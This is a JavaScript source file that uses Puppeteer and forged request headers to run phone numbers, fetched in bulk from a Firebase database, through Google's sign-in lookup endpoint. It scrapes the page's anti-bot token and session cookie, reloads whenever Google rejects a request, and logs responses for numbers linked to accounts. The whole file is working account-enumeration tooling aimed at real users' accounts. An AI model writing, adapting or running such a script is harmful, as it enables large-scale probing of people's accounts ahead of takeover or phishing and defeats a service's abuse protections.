const puppeteer = require('puppeteer')
const admin = require('./database')
const request = require('request')
const crypto = require('crypto')
const fs = require('fs')

let SERVER = 'server'
let COUNTRY = null
let CODE = null

require('events').EventEmitter.prototype._maxListeners = 100

let database = new admin()

let mServerData = null
let mHostGPS = null
let page = null
let mRecovery = null
let mReloadPage = false
let mSearch = false
let mToken = null

let mTimeToken = null
let mMultiPol = 0
let mNumber = 1172
let mCaptcha = 0
let mReject = 0

let signIn = 'https://accounts.google.com/ServiceLogin?continue=https%3A%2F%2Fmyaccount.google.com%2Fphone&rip=1&nojavascript=1&ifkv=AX3vH3_8OID3jcdWI28sWhLKyWZfo4meEPPnetcotLVnH3ejfs06Wk_CtNS4zazcrE3kC6LvY3Qy&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=en-US&service=accountsettings'

process.argv.slice(2).forEach(function (val, index) {
    if (index === 0) {
        SERVER = 'server'+val
        database.connect((error) => {
            if(!error) {
                request({
                    url: 'https://raiyan-088-default-rtdb.firebaseio.com/raiyan/code/server/'+SERVER+'.json',
                    json:true
                }, function(error, response, body){
                    if(!(error || body == null)) {
                        CODE = body['code']
                        COUNTRY = body['name']
                        request({
                            url: 'https://raiyan-088-default-rtdb.firebaseio.com/raiyan/code/gmail/found/BD/1661395844.json',
                            json:true
                        }, function(error, response, body){
                            if(!(error || body == null)) {
                                mServerData = body
                                console.log('start browser')
                                browserStart()
                            }
                        })
                    }
                })
            }
        })
    }
})


async function browserStart() {
    ;(async () => {

        let browser = await puppeteer.launch({
            headless: true,
            args: [ '--no-sandbox', '--disable-setuid-sandbox' ]
        })
    
        page = await browser.newPage()
    
        await page.setUserAgent('Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36')

        await page.goto(signIn)
        
    
        let cookie = await page.cookies()

        cookie.forEach(function (value) {
            if (value.name == '__Host-GAPS') {
                mHostGPS = value.value
            }
        })

        if(mHostGPS == null) mHostGPS = '1:bJ6IzDkUblOirycmWnLX29tiwNVKNg:EO4prJJbfARXxVTU'
        
       logInNumber(mServerData[mNumber])

    })()
}


async function logInNumber(number) {
    ;(async () => {
        if(!mReloadPage) {
            let Identifier = await getIdentifierData(CODE+number)
            
            let headers = {
                'Host': 'accounts.google.com',
                'Cache-Control': 'max-age=0',
                'Sec-Ch-Ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Upgrade-Insecure-Requests': '1',
                'Origin': 'https://accounts.google.com',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'X-Chrome-Id-Consistency-Request': 'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=67c1d328-2a6e-41c1-af1e-f65e7af75de3,signin_mode=all_accounts,signout_mode=show_confirmation',
                'X-Client-Data': 'CJK2yQEIorbJAQjEtskBCKmdygEItPLKAQiSocsBCPO7zAEIib3MAQjzwMwBCJrBzAEIs8HMAQjEwcwBCNbBzAEI3sTMAQjXxswBCJ3JzAEI4svMAQiZ0cwBCPnRzAE=',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Referer': 'https://accounts.google.com/ServiceLogin?continue=https%3A%2F%2Fmyaccount.google.com%2Fphone&rip=1&nojavascript=1&ifkv=AX3vH3_8OID3jcdWI28sWhLKyWZfo4meEPPnetcotLVnH3ejfs06Wk_CtNS4zazcrE3kC6LvY3Qy&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=en-US&service=accountsettings',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cookie': '__Host-GAPS='+mHostGPS
            }

            request({
                url: 'https://accounts.google.com/signin/v1/lookup',
                method: 'POST',
                headers: headers,
                body: getNumberData(CODE+number, Identifier)
            }, function(error, responce, body) {
                let next = true
                try {
                    if(!(error || responce.headers == null)) {
                        let url = responce.headers['location']
                        if(url != null) {
                            if(url.startsWith('https://accounts.google.com/signin/rejected')) {
                                next = false
                                ;(async () => {
                                    mReject++
                                    console.log('Reload Page')
                                    mReloadPage = true
                                    await page.goto(signIn)
                                    mReloadPage = false
                                    mNumber++
                                    console.log(mNumber, mReject, mCaptcha)
                                    logInNumber(mServerData[mNumber])
                                })()
                            } else {
                                let index = url.indexOf('TL=')
                                if(index != -1) {
                                    let tl = url.substring(index+3, url.length).split('&')[0]
                                    console.log(tl)
                                }
                            }
                        }
                    }
                } catch (e) {}
                
                if(next) {
                    mNumber++
                    console.log(mNumber, mReject, mCaptcha)
                    logInNumber(mServerData[mNumber])
                }
            })
        } else {
            await delay(1000)
            logInNumber(number)
        }
    })()
}

function getNumberData(number, identifier) {
    return 'service=accountsettings&bgresponse='+encodeURIComponent(identifier)+'&Email='+encodeURIComponent(number)+'&signIn=Next'
}

async function getIdentifierData(num) {
    let number = num
    let responce = null
    while(true) {
        if(!mSearch) {
            mSearch = true
            responce = await getIdentifierToken(number)
            if(responce == null) {
                await delay(500)
                mSearch = false
            } else {
                break
            }
        } else {
            await delay(500)
        }
    }
    mSearch = false
    return responce
}

async function getIdentifierToken(number) {
    if(page != null) {
        return await page.evaluate(async (number) => {
            let root = document.querySelector('#Email')
            if(root) {
                root.value = number
                try {
                    return document.bg.low(function(response) {
                        return response
                    })
                } catch (err) {
                    root.value = ''
                }
            }
            return null
        }, number)
    } else {
        return null
    }
}

function delay(time) {
    return new Promise(function(resolve) { 
        setTimeout(resolve, time)
    })
}
